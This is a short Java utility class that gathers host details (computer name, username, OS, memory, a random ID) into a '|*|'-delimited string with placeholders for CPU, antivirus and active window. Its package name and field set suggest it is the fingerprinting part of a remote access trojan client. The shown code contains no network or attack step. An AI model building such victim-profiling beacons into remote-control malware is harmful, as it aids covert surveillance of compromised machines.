/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ccsurat.jclient;

import java.util.UUID;
import java.net.InetAddress;

/**
 *
 * @author gotoel
 */
public class SystemUtils {
    public static String SystemInfo()
    {
        System.getProperties().list(System.out);
        String info = "";
        info += getGUID() + "|*|";
        info += "Java" + "|*|";
        info += getComputerName() + "|*|";
        info += getUsername() + "|*|";
        info += getOS() + "|*|";
        info += "CPU" + "|*|";
        info += getRAM() + "|*|";
        info += "AV" + "|*|";
        info += "ActiveWindow" + "|*|";
        return info;
    }
    
    private static String getGUID()
    {
        return UUID.randomUUID().toString().substring(0,8).toUpperCase();
    }
    
    private static String getRAM()
    {
        return Runtime.getRuntime().maxMemory() + "";
    }
    
    private static String getOS()
    {
        return System.getProperty("os.name") + " " + (System.getProperty("sun.arch.data.model").equals("64") ? "64-bit" : "32-bit"); 
    }
    
    private static String getUsername()
    {
        return System.getProperty("user.name");
    }
    
    private static String getComputerName()
    {
        String pcName = "";
        try{ 
            pcName = InetAddress.getLocalHost().getHostName();
        } catch(Exception ex)
        {
        }
        return pcName;
    }
    
}
